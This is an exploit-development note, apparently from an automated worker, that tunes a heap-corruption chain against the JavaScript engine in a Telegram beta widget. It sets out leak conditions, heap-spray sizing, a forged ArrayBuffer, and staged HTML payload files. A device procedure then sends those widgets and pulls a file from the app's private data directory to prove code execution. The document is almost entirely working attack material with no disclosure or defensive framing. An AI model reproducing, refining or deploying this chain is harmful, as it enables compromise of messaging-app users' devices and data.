# Local-variable / class-shift ladder: measurement and the cpool alternative

Date: 2026-11-08. Host-only. Worker: `hunt_parser`. No device access. The
device evidence: 3,200×881 survives NOCORR; 3,600 OOMs; the two-wave NOCORR;
the class-896 mismatch is confirmed; the argc>1 ladder is dead (no leak).

## 1. Local-variable ladder (original trigger shape, argc=1)

`function f([] = eval("[]")) { var q1..qN; return 30 floats; }`, A_ab-style
1,000×AB(1,980) spray, `src_diag`:

| N | fsize (ACV BSIZE) | varc | count=1+varc | generic class | target | 1980-buf/off | leak |
|---:|---:|---:|---:|---:|---|---|---|
| 0 | 813 (816) | 3 | 4 | 896 | vd_base+1,310,700 | 647 / 748 | 65534 |
| 8 | 996 (1008) | 11 | 12 | 1024 | vd_base+1,310,700 | 647 / 556 | 65534 |
| 16 | 1180 (1184) | 19 | 20 | 1280 | vd_base+1,310,700 | 648 / 380 | 65534 |
| 32 | 1548 (1552) | 35 | 36 | 1792 | vd_base+1,310,700 | 647 / 12 | 65534 |
| 64 | 2284 (2288) | 67 | 68 | 2560 | vd_base+1,310,700 | 647 / 1276 | 65534 |
| 128 | 3756 (3760) | 131 | 132 | 4096 | vd_base+1,310,700 | 649 / 1260 | 65534 |

Key facts:

* **The leak always fires** (`ACV scope_idx=65534`, `argc=1`). Adding local
  vars does not touch the arg scope.
* The target **byte offset is constant**: `target = vd_base + 1,310,700`.
  The class grows (896 → 1024 → 1280 → 1792 → 2560 → 4096), so the chunk
  delta shrinks: 1,463 / 1,280 / 1,024 / 732 / 512 / 320 chunks.
* The A_ab 1,980-B buffers contain the target on the host for every N (the
  host glibc interleaves; the `buf/off` varies 12-1,276). On the device only
  a class-matched spray works.
* **The closure count grows with varc**: 4/12/20/36/68/132. The forged-AB
  trick requires the count=7 (56-B, class-64) closure array and the T[599]
  class-64 victim. N≠3 loses the loot: a 132-entry array is 1,056 B in a
  larger class with slack, and the OOB entries no longer land on an AB
  struct. The local-var ladder is a **containment-only** lever.

## 2. The cpool shift (recommended): class 4096 with count=7

Keep `function f([] = eval("[]")) { var q1,q2,q3; return <180 floats>; }` -
single parameter, varc=6, count=7; and inflate `b` with **constants**:

* `FSIZE argc=1 varc=6 cvc=0 cpool=180 bc=583 fsize=3731` → generic class
  **4096**: `ACV scope_idx=65534`, `ACV BSIZE 3744`; the T[599] victim and
  the 327,744-B forged AB are unchanged.
* Target = `vd_base + 1,310,700`; `vardefs_off = 128 + 180*16 = 3008`;
  target delta = `(3008+1,310,700)/4096 = 320.7` chunks; phase 2,988.
* Spray: `700 × ArrayBuffer(4096)` = 2.87 MB requested; class 4096 = b's
  class → same tag; the target chunk is ~321 after b; the 700 chunks cover
  the five-level target with margin. The 8 MB budget: 2.87 MB spray +
  ~0.1 MB kept atoms + D/T + runtime + engine baseline (~3.2 MB) ≈ 7.5 MB.
* Host: `run_plain -l 8` **5/5** `RESULT ABLEN[599]=327744 VLEN=327744`;
  full chain with `endG3_host` **5/5** `HF OK` + 162-B proof; all-4 safe
  probe **5/5** `SAFE4096`.

The cpool variant is strictly better than the local-var ladder and the
argc ladder: it moves `b` to the large class while keeping the arg scope
empty (leak) and the closure count at 7 (loot).

## 3. The `arg_count` ladder is dead (confirmed)

N1's `tmp/argc{32,64,128}.js` (named `p0..pN-1` + `[] = eval("[]")`):
`argc=33/65/129`, `ACV scope_idx=31/63/127`; **no 65534 leak**, no ACV
BSIZE/OOB. The leading parameters populate the arg scope. Extra parameters
cannot be used, even empty patterns: a two-param `function f([], [] =
eval("[]"))` gives `fsize=335` and no ACV OOB. The reported b sizes also
differ from the analytic table: 2507/4139/7403 (varc 38/70/134), classes
2560/5120/8192, and the closure count grows. Discard this ladder.

## 4. Deliverables (host-proven)

| widget | raw | zlib9 | notes |
|---|---:|---:|---|
| `device/widget/c4096_probe_72889.html` | 7,996 | 979 | all-4 safe probe, class 4096 |
| `device/widget/c4096_final_72889.html` | 7,996 | 3,183 | JUMP/TERM stage A + endG3_dev (patched pivot) |
| `device/widget/c4096_debug_72889.html` | 7,996 | 3,184 | stage C `S1 ...` |
| host twins | 7,980 | 3,176/3,177/979 | `endG3_host` |

A/B/C lengths are identical across probe/final/debug (A=2,503, B=4,957,
C=408; the all-4 probe A is padded to 2,503), so the pre-A heap does not
shift. The blind path `/tmp/opencode/tgbot/widget.html` holds the safe probe.

## 5. Device spec (no Frida, no per-device value)

1. Send `c4096_probe_72889.html` (all-4 pattern). Expected stage C:
   `PRB M=SAFE4096 A=-1` (survives; the class-4096 tag matches; the leak is
   live). If the probe dies at stage A, the 4096 class is not tag/region
   compatible on this build → fall back to class 2560 (`N≈130` floats,
   AB(2560) ~1,100 chunks) and repeat.
2. Send `c4096_final_72889.html`. Expected stage A
   `RESULT ABLEN[599]=327744 VLEN=327744`; stage B `HF OK`; then close/reopen
   the widget (teardown) and pull
   `/data/user/0/org.telegram.messenger.beta/files/n1`; expect `uid=10346`.
   A crash after `HF OK` is expected.
3. No `chain_off`, no Frida; the endgame's known build constants (72889) are
   the only fixed values.

## 6. Files

```
device/LOCALVAR_CLASS_ANALYSIS.md       this note
device/widget/c4096_{probe,final,debug}_{72889,host}.html
device/gen_* (existing universal generators; the cpool A was built by
  replacing the return expression with 180 floats and the AB size/count)
```

The N1 worker's universal/ stage-A rebuild should adopt the cpool shift and
the class-matched 4096 spray; the local-var variants can be kept only as
containment probes (no T[599] loot).
